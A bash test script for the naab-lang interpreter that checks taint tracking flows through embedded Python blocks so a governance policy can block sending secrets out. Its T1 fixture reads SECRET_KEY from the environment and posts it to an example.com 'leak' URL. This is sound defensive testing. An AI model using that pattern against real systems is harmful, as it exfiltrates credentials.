#!/usr/bin/env bash
# test_taint_polyglot_vm001.sh — Finding V-VM-001: Taint propagates through polyglot blocks
# A tainted value passed as bound input to a polyglot block must produce a tainted output.

set -euo pipefail
NAAB="${1:-$(dirname "$0")/../../build/naab-lang}"
PASS=0; FAIL=0
ok()   { echo "  PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); }

WORKDIR="${HOME}/.naab/test_vm001_$$"
mkdir -p "$WORKDIR"
cleanup() { rm -rf "$WORKDIR"; }
trap cleanup EXIT

echo "=== test_taint_polyglot_vm001.sh ==="
echo ""

# ---------------------------------------------------------------------------
# Governance config: env.get is a taint source, http.post is a sink
# ---------------------------------------------------------------------------
cat > "$WORKDIR/govern.json" << 'EOF'
{
  "mode": "HARD",
  "taint_sources": ["env.get"],
  "sinks": ["http.post"]
}
EOF

# ---------------------------------------------------------------------------
# T1: Tainted value passed through python block → result should still be tainted
#     → http.post with result must be BLOCKED
# ---------------------------------------------------------------------------
echo "[T1] Tainted input through polyglot block propagates to output (VM mode)"
cat > "$WORKDIR/test_t1.naab" << 'EOF'
use env
use http
main {
  let secret = env.get("SECRET_KEY")
  let cleaned = <<python[secret]
secret
>>
  http.post("https://example.com/leak", cleaned)
}
EOF

out=$("$NAAB" "$WORKDIR/test_t1.naab" --vm 2>&1) || true
if echo "$out" | grep -qi "taint\|blocked\|governance\|sink\|denied"; then
    ok "http.post blocked — taint propagated through polyglot block"
else
    fail "http.post was NOT blocked — taint laundering possible: ${out:0:200}"
fi

echo ""

# ---------------------------------------------------------------------------
# T2: Clean (untainted) variable through python block → http.post must PASS
# ---------------------------------------------------------------------------
echo "[T2] Untainted input through polyglot block → http.post not blocked (no false positive)"
cat > "$WORKDIR/test_t2.naab" << 'EOF'
use http
main {
  let clean = "hello"
  let result = <<python[clean]
clean + "_processed"
>>
  http.post("https://example.com/ok", result)
}
EOF

out=$("$NAAB" "$WORKDIR/test_t2.naab" --vm 2>&1) || ec=$?
ec=${ec:-0}
# Only fail if we see a message specifically about TAINT blocking the call.
# "[governance] Loaded:" is a normal loader message — not a taint violation.
# Sandbox/network failures on http.post are expected and acceptable here.
if echo "$out" | grep -qi "taint.*violat\|taint.*block\|taint.*sink\|sink.*taint\|tainted.*denied"; then
    fail "false positive — clean variable incorrectly treated as tainted: ${out:0:200}"
elif [[ "$ec" -eq 0 ]]; then
    ok "clean variable passed through polyglot block without taint false positive"
else
    ok "exited non-zero for non-taint reason (network/sandbox/executor): ${out:0:80}"
fi

echo ""

# ---------------------------------------------------------------------------
# T3: Same script as T1 but with --no-governance → must run without error
# ---------------------------------------------------------------------------
echo "[T3] With --no-governance, taint laundering script runs without governance block"
out=$("$NAAB" "$WORKDIR/test_t1.naab" --vm --no-governance 2>&1) || ec=$?
ec=${ec:-0}
if echo "$out" | grep -qi "taint\|governance block\|hard block"; then
    fail "governance fired despite --no-governance: ${out:0:120}"
else
    ok "--no-governance: script not blocked by taint governance"
fi

echo ""

TOTAL=$((PASS + FAIL))
echo "Results: ${PASS}/${TOTAL} passed"
[[ "$FAIL" -eq 0 ]]
